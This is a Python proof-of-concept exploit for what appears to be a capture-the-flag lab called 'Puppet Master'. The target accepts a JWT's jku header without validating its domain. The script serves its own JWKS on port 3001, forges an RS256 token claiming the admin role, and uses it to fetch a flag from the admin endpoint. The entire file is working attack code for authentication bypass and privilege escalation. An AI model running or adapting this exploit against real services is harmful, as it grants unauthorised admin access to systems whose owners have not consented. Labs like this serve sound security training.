#!/usr/bin/env python3
"""
Lab #7 - Puppet Master
Vulnerability : header.jku passed as jwksUri without domain validation
Attack        : serve attacker JWKS on localhost:3001, point jku at it, sign with own key
"""
import argparse, base64, json, sys, threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import requests
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from pwn import log


ATTACKER_PORT = 3001
KID           = 'attacker-key-1'


def parse_args():
    p = argparse.ArgumentParser(description='Lab #7 - Puppet Master PoC')
    p.add_argument('--url', default='http://localhost:3000', metavar='URL',
                   help='target base URL (default: http://localhost:3000)')
    p.add_argument('--jwks-host', default='localhost', metavar='HOST',
                   help='hostname the server uses to reach this machine (use host.docker.internal with Docker)')
    return p.parse_args()


def b64url_enc(b):
    if isinstance(b, str):
        b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()


def int_to_b64url(n):
    length = (n.bit_length() + 7) // 8
    return b64url_enc(n.to_bytes(length, 'big'))


def make_jwks(private_key):
    pub = private_key.public_key().public_numbers()
    return json.dumps({'keys': [{
        'kty': 'RSA', 'use': 'sig', 'alg': 'RS256', 'kid': KID,
        'n': int_to_b64url(pub.n),
        'e': int_to_b64url(pub.e),
    }]})


def start_jwks_server(jwks_json):
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(jwks_json.encode())
        def log_message(self, *args):
            pass

    server = HTTPServer(('0.0.0.0', ATTACKER_PORT), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server


def forge_token(private_key, payload, jku):
    header = b64url_enc(json.dumps(
        {'alg': 'RS256', 'typ': 'JWT', 'kid': KID, 'jku': jku}, separators=(',', ':')
    ))
    body = b64url_enc(json.dumps(payload, separators=(',', ':')))
    sig  = b64url_enc(private_key.sign(f'{header}.{body}'.encode(), padding.PKCS1v15(), hashes.SHA256()))
    return f'{header}.{body}.{sig}'


def main():
    args = parse_args()
    base_url = args.url.rstrip('/')
    jku_url  = f'http://{args.jwks_host}:{ATTACKER_PORT}/jwks.json'

    s = requests.Session()

    log.info(f'Target: {base_url}')
    log.info('Logging in as alice...')
    r = s.post(f'{base_url}/api/login', json={'username': 'alice'})
    r.raise_for_status()
    log.success(f'Legitimate token: {s.cookies["session"][:72]}...')

    log.info('Generating attacker RSA keypair...')
    attacker_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

    log.info(f'Starting attacker JWKS server -> {jku_url}')
    start_jwks_server(make_jwks(attacker_key))

    forged = forge_token(attacker_key, {'name': 'hacker', 'role': 'admin', 'iat': 1715000000}, jku_url)
    log.info(f'Forged token (jku -> attacker server): {forged[:72]}...')

    r = requests.get(f'{base_url}/api/admin/config', cookies={'session': forged})
    if r.status_code != 200:
        log.failure(f'Status {r.status_code}: {r.text}')
        sys.exit(1)

    log.success(f'FLAG: {r.json()["flag"]}')


if __name__ == '__main__':
    main()
